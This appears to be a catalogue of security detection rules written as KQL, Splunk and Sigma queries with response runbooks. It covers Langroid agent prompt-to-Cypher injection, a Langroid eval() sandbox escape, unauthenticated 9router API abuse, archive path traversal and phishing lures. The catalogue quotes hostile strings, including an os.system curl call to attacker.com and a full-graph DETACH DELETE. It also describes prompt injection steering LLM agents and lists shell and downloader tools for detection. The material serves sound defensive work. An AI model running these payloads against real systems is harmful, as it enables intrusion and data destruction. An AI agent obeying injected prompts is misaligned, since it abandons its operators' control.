1) Triage: identify the query text and the connecting principal; confirm whether it originated from the Langroid Neo4jChatAgent session vs a known DBA/ETL account. 2) Contain: if from the agent, set allow_dangerous_operations=False (upgrade to langroid 0.65.5) and revoke APOC/dbms procedures from the agent's DB role so the ceiling primitives are unreachable. 3) Hunt: pull all queries from that session, correlate to the preceding LLM prompt / RAG source, and check the Neo4j host for outbound egress (see the SSRF UC) and any spawned OS processes.
Syslog
| where TimeGenerated > ago(7d)
| where ProcessName has "neo4j" or SyslogMessage has "query.log" or SyslogMessage has "Cypher"
| where SyslogMessage has_any ("apoc.load", "apoc.cypher.run", "apoc.cypher.runFile", "apoc.import", "apoc.export", "dbms.executeSystemCommand", "dbms.security", "CALL db.", "LOAD CSV")
| project TimeGenerated, Computer, ProcessName, SyslogMessage
| order by TimeGenerated desc

This is the precondition check the reviewer requested: agent instantiated without the statement-type allowlist / opt-out gate. Vulnerable-version presence is the deterministic precondition for the prompt-to-Cypher injection. Cross-checked against: • https://github.com/advisories/GHSA-2pq5-3q89-j7cc

  • Isolated dev/test host running an old Langroid pin with no Neo4jChatAgent actually wired up
  • Host where Neo4jChatAgent runs against a least-privilege DB role with APOC/dbms already stripped (residual, lower-risk exposure)
  • SBOM lag showing 0.65.4 after an in-progress upgrade to 0.65.5
  • Vendored/frozen copy in a container image that is never executed
  • TVM catalog attributing the CVE to a mirror/fork package name
Response runbook
1) Triage: confirm the host actually instantiates Neo4jChatAgent (or ArangoChatAgent) and whether the connected DB role has APOC/dbms procedures granted. 2) Contain: upgrade pip:langroid to >= 0.65.5 and run the agent against a least-privilege Neo4j role; where upgrade lags, set allow_dangerous_operations=False and revoke apoc.*/dbms.* from the role. 3) Hunt: on confirmed-exposed hosts, pull Neo4j query.log for the dangerous-primitive UC and check the DB host for the SSRF egress pattern.

Destructive Cypher wipe via Langroid Neo4jChatAgent (MATCH (n) DETACH DELETE n) AIActions on Objectives High
Hunts the article's explicit floor primitive — full-graph destruction via MATCH (n) DETACH DELETE n and other write/drop clauses — appearing in Neo4j query/audit logs. Because the write path performs no statement-type allowlist, an injected prompt can wipe the graph with no APOC dependency. Rationale: Article names MATCH (n) DETACH DELETE n verbatim as the unrestricted destroy primitive that passes the write path (the same statement the built-in remove_database helper runs), making it a concrete, high-fidelity string. Distinct pivot from the RCE UC: data-destruction impact rather than code-exec, and a disjoint token set. Cross-checked against: • https://github.com/advisories/GHSA-2pq5-3q89-j7cc • https://github.com/advisories/GHSA-mxfr-6hcw-j9rq

Data sources
Expected false positives · estimated rate: low — model-assessed, tune to your environment

  • Test-suite teardown running MATCH (n) DETACH DELETE n between runs
  • Schema migration dropping and rebuilding constraints/indexes
  • Langroid's own remove_database maintenance helper invoked deliberately by an operator
  • Bulk re-import job that truncates the graph before reload
Suppression filter
| where ProcessName !has "test" and Computer !has "dev"

1) Triage: capture the full query and connecting principal; determine if it came from the Langroid agent session vs an interactive DBA/test account, and whether it targeted prod. 2) Contain: if attacker-steered, kill the agent session, disable the Neo4jChatAgent, and initiate graph restore from the latest backup; set allow_dangerous_operations=False on upgrade. 3) Hunt: review the session for preceding read (cypher_retrieval_tool) reconnaissance and the injecting prompt/RAG source, and check siblings (ArangoChatAgent AQL) for parallel abuse.

9router unauthenticated /api/* endpoint enumeration (GHSA-vjc7-jrh9-9j86) AIReconnaissance Medium
Hunts scripted enumeration of 9router's unauthenticated Next.js API surface — a single client hitting 5+ of the known 9router /api/* endpoint classes with a non-browser user-agent inside a 5-minute window. This is the recon step that precedes provider tampering and API-key theft, keyed to the exact endpoint list the advisory published. Rationale: Uses the exact unauthenticated endpoint list from the advisory's 'Affected Endpoints' table plus the curl user-agent from the PoC; the distinct-path burst from a scripted client is the enumeration precursor to the CRUD/leak abuse. Cross-checked against: • https://github.com/decolua/9router/issues/431 • https://github.com/decolua/9router/security • https://github.com/advisories/GHSA-vjc7-jrh9-9j86
ATT&CKT1595.002 T1046

  • CI/CD smoke test hitting several API routes with a scripted client after deploy
  • Legitimate operator using curl/Postman to debug the dashboard during maintenance
  • Search-engine or SaaS crawler indexing an internet-exposed instance

| where CIp !in ("<approved-scanner-ips>") and UserAgent !has "UptimeMonitor"

1) Triage: confirm CIp is not an approved scanner/monitor and CsHost is the 9router instance; review the make_set of paths — presence of /api/usage/stats + /api/providers together signals targeted 9router recon, not generic noise. 2) Contain: block the source IP at the reverse proxy/WAF and put the 9router admin API behind authentication or an allow-list immediately (the advisory confirms zero auth on these routes). 3) Hunt: pivot the same CIp forward to UC 'provider mutation' and 'request-details bulk read' to see if recon progressed to CRUD or exfiltration; rotate any provider API keys if it did.

9router unauthenticated provider CRUD mutation (rogue-provider / key-swap / DoS delete) AIActions on Objectives High
Hunts POST/PUT/DELETE against /api/providers and /api/providers/:id — the unauthenticated write operations that let an attacker inject an attacker-controlled proxy provider, swap API keys, or delete all providers for denial of service. Any successful mutation to this route is high-signal because the endpoint has no auth middleware per the advisory root-cause. Rationale: Directly encodes reproduction steps 2-4 (POST/PUT/DELETE to /api/providers[/uuid]) from the advisory; the write methods against this specific unauthenticated route are the rogue-provider and DoS primitives, so a 2xx response is a confirmed state change. Cross-checked against: • https://github.com/decolua/9router/issues/431 • https://github.com/advisories/GHSA-vjc7-jrh9-9j86
ATT&CKT1565.001 T1098.003

Expected false positives · estimated rate: low — model-assessed, tune to your environment

  • QA/staging test suite exercising provider CRUD against a non-production instance
  • Bulk provider cleanup during a planned migration or version upgrade

1) Triage: inspect UserAgent and Referer — a browser UA with a same-host dashboard Referer suggests legit admin use; a curl/python UA or absent Referer on a POST/PUT/DELETE is the exploit shape. Pull the CIp's recent history. 2) Contain: for DELETE or attacker-UA writes, snapshot current provider config, revoke/rotate every provider API key and GitHub Copilot OAuth token that 9router stored, and gate /api/providers behind auth. 3) Hunt: check whether newly created providers point 9router at an attacker-controlled endpoint (traffic redirection); review /api/usage/request-logs reads from the same IP for prompt/response capture.

| order by TimeGenerated desc

9router unauthenticated read of API-key-leaking usage/stats & provider config AIActions on Objectives High
Hunts unauthenticated GET reads of /api/usage/stats (returns full plaintext API keys), /api/usage/request-logs (all users' request history), and /api/providers (partial creds + GitHub Copilot OAuth tokens + Cloudflare account IDs). Scoped to scripted / off-dashboard clients so it flags credential harvesting rather than normal browser dashboard rendering. Rationale: Targets the three read endpoints the advisory flags as leaking full 'sk-...' keys, request history, and Copilot OAuth tokens (reproduction steps 1 & 5-6); the scripted-UA / no-Referer scope separates credential harvesting from the browser-driven dashboard that also GETs these paths. Cross-checked against: • https://github.com/decolua/9router/issues/431 • https://github.com/advisories/GHSA-vjc7-jrh9-9j86

1) Triage: confirm the CIp is external/unexpected and the read returned 200 with a non-trivial ScBytes (data actually delivered). 9router bulk exfiltration of conversation history via /api/usage/request-details AIActions on Objectives High
Hunts high-volume sequential reads of /api/usage/request-details/:id — the unauthenticated endpoint that returns full conversation turns (system prompts, user messages, assistant responses, tool calls, reasoning traces) for any user. Fires when one source pulls 50+ distinct records or exfiltrates >50MB of response body within 30 minutes. Rationale: Encodes reproduction step 7 (/api/usage/request-details/<uuid>) and the advisory's 'full conversation history of other users' impact; the distinct-record and 50MB response-body thresholds separate a targeted mass-harvest from an operator viewing a single conversation. Cross-checked against: • https://github.com/decolua/9router/issues/431 • https://github.com/advisories/GHSA-vjc7-jrh9-9j86
ATT&CKT1020 T1213
Data sourcesWeb.Web
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Legitimate data-export or GDPR/DSAR job iterating over request records with a service account
  • Analytics pipeline batch-reading conversation records for internal reporting
  • Admin paginating through many conversations in the dashboard during an investigation
  • Load/performance test replaying request-details reads against a staging instance
Suppression filter
| where CIp !in ("<approved-export-job-ip>","<analytics-pipeline-ip>")
Response runbook
1) Triage: confirm the CIp is not an approved export/analytics job and review TotalBytesOut and DistinctRecords — a scripted UA pulling 50+ distinct UUIDs is a mass conversation-history harvest. 2) Contain: block the source at the WAF/proxy, gate /api/usage/* behind authentication, and treat all conversation content (system prompts, credentials embedded in prompts, tool calls) as exposed. 3) Hunt: correlate with the API-key-leak and provider-mutation UCs from the same IP; notify affected users whose request UUIDs were read and rotate any secrets that may have appeared inside leaked prompts/responses.

Langroid TableChatAgent/VectorStore eval() RCE: Python spawns OS shell/download child AIExploitation High
Hunts the CVE-2026-54769 sandbox escape where a Langroid agent's eval(code, vars, {}) executes an LLM-supplied expression like __import__('os').system('curl http://attacker.com/pwned'). The observable is the Langroid python interpreter directly spawning a shell / curl / wget / touch child — behaviour a data-analysis agent should never produce. Rationale: Anchors on the article's exact payload primitives (__import__, os.system, PoC canary /tmp/rce_success_table) and the vulnerable module names (table_chat_agent, pandas_eval, vector_store) as the parent context — a Langroid python interpreter spawning a shell or curl is the direct footprint of the eval() escape and is not normal agent behaviour. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc • https://github.com/langroid/langroid/blob/main/langroid/agent/special/table_chat_agent.py#L239 • https://github.com/langroid/langroid/blob/main/langroid/vector_store/base.py#L225
ATT&CKT1059.006 T1203
Data sourcesEndpoint.Processes
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Legitimate Langroid/LLM agents that shell out to run pandas subprocesses or system tools during normal analysis
  • Data-science notebooks where python calls os.system('curl ...') to fetch datasets to /tmp
  • CI runners executing python that invoke curl/wget for dependency fetches
  • Custom internal agents that intentionally use subprocess for file conversion (touch/nc for health checks)
Suppression filter
| where not(InitiatingProcessCommandLine has_any ("ci-runner","conftest","pytest") and ProcessCommandLine has "artifactory")
Response runbook
1) Triage: pull the full parent python command line and the child cmdline — confirm the child references a network fetch or filesystem write and the python process is a Langroid/LLM agent (site-packages/langroid on the folder path). Capture destination host. 2) Contain: isolate the host, kill the agent process tree, and rotate any DB/API credentials the agent process held (the agent runs with host privileges). 3) Hunt: search DeviceNetworkEvents for the child's egress destination across the fleet, look for /tmp/rce_success* or other agent-written files, and verify the Langroid version is <= 0.65.1 (upgrade to patched release).
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName matches regex @"(?i)^python[0-9.]*$"
| where FileName in~ ("sh","bash","dash","curl","wget","touch","nc","ncat")
| where ProcessCommandLine has_any ("__import__","os.system","/tmp/rce_success","curl http","wget http")
    or InitiatingProcessCommandLine has_any ("langroid","table_chat_agent","pandas_eval","vector_store")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ParentProcessName matches regex @"(?i)^python[0-9.]*$" or ParentProcessName has "python"
| where TargetProcessName has_any ("sh","bash","dash","curl","wget","touch","nc","ncat")
| where TargetProcessCommandLine has_any ("__import__","os.system","/tmp/rce_success","curl http","wget http")
    or ParentProcessCommandLine has_any ("langroid","table_chat_agent","pandas_eval","vector_store")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

Native Python egress from Langroid agent to non-LLM host (urllib/requests eval exfil) AICommand & Control Medium
Hunts the C2/exfil half of CVE-2026-54769 where the eval() payload uses in-process python (urllib/requests) or a spawned curl to reach an attacker host rather than a legitimate LLM API. Flags outbound connections initiated by a Langroid python process to destinations outside the known LLM/provider allowlist. Rationale: Scopes egress to the Langroid python process (folder/cmdline references langroid, table_chat_agent, pandas_eval) and subtracts the legitimate LLM-provider allowlist derived from the article's own config (api.deepseek.com), so any remaining public destination is a candidate C2/exfil channel from the eval() escape. ASIM ImNetworkSession has no process-attribution column, so the Sentinel variant is host-scoped (SrcHostname) and intentionally broader — pair it with the process-tree UC for fidelity. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc
ATT&CKT1071.001 T1041
Data sourcesNetwork_Traffic.All_Traffic
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Langroid agents legitimately calling non-mainstream/self-hosted LLM endpoints or local model gateways not in the allowlist
  • Agent tools that fetch web content (web-search plugins) to public sites as part of normal operation
  • Telemetry/observability agents (LangSmith, Weights & Biases) that the python process reports to
  • pip/conda dependency resolution reaching PyPI or CDN mirrors from the same interpreter
Response runbook
1) Triage: identify the destination (RemoteUrl/RemoteIP), enrich against threat intel, and confirm the initiating python process is a Langroid agent. Check whether the same host also showed the python->shell RCE signal. 2) Contain: block the destination at the egress proxy/firewall and isolate the host if the destination is unknown/malicious. 3) Hunt: pivot on the destination across all agents, review the agent's transcript/prompt logs for injection strings, and confirm no data (DB dumps, files) left via that channel.
let LLMAllow = dynamic(["openai.com","api.deepseek.com","deepseek.com","anthropic.com","googleapis.com","cohere.ai","huggingface.co","azure.com","openai.azure.com"]);

Post-RCE tool staging: curl/wget download to ephemeral path spawned by Langroid python/shell AIInstallation Medium
Hunts second-stage ingress tool transfer after the CVE-2026-54769 eval() RCE, where the initial os.system() payload pulls a follow-on binary/script into /tmp, /dev/shm, or /var/tmp. Flags curl/wget downloads with an output path in an ephemeral directory that were spawned by a python interpreter or shell. Rationale: Chains the article's os.system('curl http://attacker.com/pwned') primitive to the classic follow-on: the same shell/python fetches a stage-2 payload into an ephemeral directory. Requiring parent=python/shell AND a URL AND an ephemeral output path keeps this article-specific and much tighter than a bare curl-to-internet rule. Cross-checked against: • https://github.com/advisories/GHSA-q9p7-wqxg-mrhc

Node.js archive-extraction process writing into privileged persistence/privesc paths AIInstallation High
Hunts a node/nodejs process (the runtime the @xhmikosr/decompress and decompress libraries run in) writing files into system paths that live OUTSIDE any normal extraction directory — cron, systemd, ld.so.preload, sudoers.d, ssh authorized_keys. CVE-2026-53486 lets a crafted tar/tar.gz/tar.bz2/zip entry escape the output dir (broken `realPath.indexOf(outputPath)` prefix check) and land a payload on one of these sinks; a node process touching them is the observable landing. Rationale: Grounded in the article's core claim that a crafted entry can 'read or write files outside that directory' via the broken prefix check, scoped to the node runtime that decompress/@xhmikosr/decompress execute in. The sink paths are the canonical Linux privesc/persistence targets a write-outside-dir primitive lands on; a node process writing to them is highly anomalous. Cross-checked GHSA-qgfr-5hqp-vrw9 (prior decompress Zip-Slip) confirming the class. Cross-checked against: • https://github.com/advisories/GHSA-qgfr-5hqp-vrw9 • https://nvd.nist.gov/vuln/detail/CVE-2020-12265
ATT&CKT1053.003 T1574.006 T1098.004
Data sourcesEndpoint.Filesystem
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • pm2 startup writing a systemd unit for a Node app (InitiatingProcessCommandLine contains 'pm2')
  • Node-based installers/CLIs (e.g. some npm postinstall scripts) legitimately dropping a systemd service
  • Configuration-management tooling that shells out to node to render cron/systemd files
  • Developer laptops running local build scripts that generate /usr/local/sbin helpers
  • CI base-image build steps that legitimately seed /etc/cron.d during image bake
Suppression filter
| where InitiatingProcessCommandLine !has "pm2" and InitiatingProcessCommandLine !has "systemctl"
Response runbook
1) Triage: pull the full InitiatingProcessCommandLine and parent chain — confirm whether node was invoked to extract an archive (look for a temp/download path and the decompress/@xhmikosr/decompress module in the cmdline or nearby FileEvents). Inspect the dropped file's contents/SHA256. 2) Contain: quarantine the written file, kill the node PID, and revoke any credential the process could reach if authorized_keys/sudoers.d was written; snapshot the host. 3) Hunt: search the same host+user for other node file writes outside expected project dirs, for a preceding archive download, and for setuid/symlink creations (see companion UCs).

Cron/systemd unit dropped by node then executed within 5 minutes AIInstallation High
Correlates a node process writing a job/unit into /etc/cron.* or /etc/systemd/system with that job actually firing (executed by cron/crond/systemd) within 5 minutes on the same host — turning the CVE-2026-53486 directory-escape write into confirmed persistence activation rather than a benign file drop. Rationale: Directly implements reviewer hypothesis #2: the pipeline elsewhere sees only the write; this UC proves activation by correlating the node-authored cron/systemd file with a cron/systemd-parented execution of that same file within 5 minutes. The 300s window and cron/crond/systemd parent constraint keep FPs near zero. Cross-checked against: • https://github.com/advisories/GHSA-qgfr-5hqp-vrw9
ATT&CKT1053.003 T1543.002
Data sourcesEndpoint.Filesystem Endpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • A Node deployment tool (pm2, node-based provisioners) that writes a systemd unit and immediately starts it
  • CI pipelines that generate and immediately run a cron.daily maintenance script
  • Package postinstall that drops and triggers a systemd timer
  • Admin manually editing a cron.d file via a node-wrapped editor then it runs on the next minute boundary
Suppression filter
| where ActingProcessCommandLine !has "pm2" and DroppedPath !has "puppet" and DroppedPath !has "ansible"
Response runbook
1) Triage: confirm the dropped file was authored by a node archive-extraction context (check the preceding node FileWritten and any archive download), then read the executed command line. 2) Contain: disable/remove the cron entry or systemd unit (systemctl disable --now / rm), kill the spawned process tree, isolate the host. 3) Hunt: enumerate all persistence written by the same node PID/user, review outbound connections from the executed job for C2, and check peer hosts sharing the same CI base image or artifact.

Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
Inbound recruiter-themed job-interview phish linking to Salesforce/exct.net → wiseagent redirect infra AIDelivery High
Hunts delivered inbound mail impersonating brand recruiters (marketing-role lure) whose links resolve to the campaign's abused redirect infrastructure (exct.net / wiseagent.com) or the adidas-hiring.com lookalike landing page. Article-specific because it pairs the recruiter/interview lure vocabulary with the exact laundering domains Will Thomas documented, not generic phishing.
ATT&CKT1566.002 T1656
Data sources
let LookbackDays = 14d;
let PhishDomains = dynamic(["adidas-hiring.com","wiseagent.com"]);
EmailEvents
| where Timestamp > ago(LookbackDays)
| where EmailDirection == "Inbound"
| where DeliveryAction in ("Delivered","DeliveredAsSpam")
| join kind=inner (EmailUrlInfo | where Timestamp > ago(LookbackDays) | project NetworkMessageId, Url, UrlDomain) on NetworkMessageId
| where UrlDomain in~ (PhishDomains) or (UrlDomain endswith "exct.net" and Subject has_any ("interview","recruiter","marketing role","hiring","schedule a call","opportunity"))
| project Timestamp, SenderFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, Url, UrlDomain, DeliveryAction
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
let LookbackDays = 14d;
let PhishDomains = dynamic(["adidas-hiring.com","wiseagent.com"]);
EmailEvents
| where TimeGenerated > ago(LookbackDays)
| where EmailDirection == "Inbound"
| where DeliveryAction in ("Delivered","DeliveredAsSpam")
| join kind=inner (EmailUrlInfo | where TimeGenerated > ago(LookbackDays) | project NetworkMessageId, Url, UrlDomain) on NetworkMessageId
| where UrlDomain in~ (PhishDomains) or (UrlDomain endswith "exct.net" and Subject has_any ("interview","recruiter","marketing role","hiring","schedule a call","opportunity"))
| project TimeGenerated, SenderFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, Url, UrlDomain, DeliveryAction
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Office Application Spawning Script Host
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d07
status: experimental
description: |
    Word/Excel/Outlook/OneNote spawning powershell, cmd, wscript,
    cscript, mshta, rundll32, regsvr32 — classic macro / embedded-
    object payload signature.
references:
    - https://attack.mitre.org/techniques/T1059/
    - https://attack.mitre.org/techniques/T1566/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059
    - attack.t1566.001
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\outlook.exe'
            - '\onenote.exe'
            - '\mspub.exe'
            - '\visio.exe'
    selection_child:
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
    condition: selection_parent and selection_child
falsepositives:
    - Legitimate automation macros in trusted internal documents
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) Exploitation High
Browser-pasted PowerShell launched from explorer/Run dialog — ClickFix social engineering.
ATT&CKT1204.004 T1059.001
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("explorer.exe","RuntimeBroker.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","mshta.exe")
| where ProcessCommandLine matches regex @"(?i)(iex|invoke-expression|frombase64|downloadstring|hxxp|curl |wget )"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName endswith "\explorer.exe"
   or ParentProcessName endswith "\RuntimeBroker.exe"
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\pwsh.exe"
   or NewProcessName endswith "\mshta.exe"
| where CommandLine matches regex @"(?i)(iex|invoke-expression|frombase64|downloadstring|hxxp|curl |wget )"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: FakeCaptcha / ClickFix - Clipboard-Injected PowerShell from Explorer
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d06
status: experimental
description: |
    "FakeCaptcha" / "ClickFix" social-engineering: malicious site asks
    user to press Win+R and paste a payload. The result is
    powershell/mshta launched directly from explorer.exe with iex /
    base64 / downloadstring in the command line.
references:
    - https://attack.mitre.org/techniques/T1059/001/
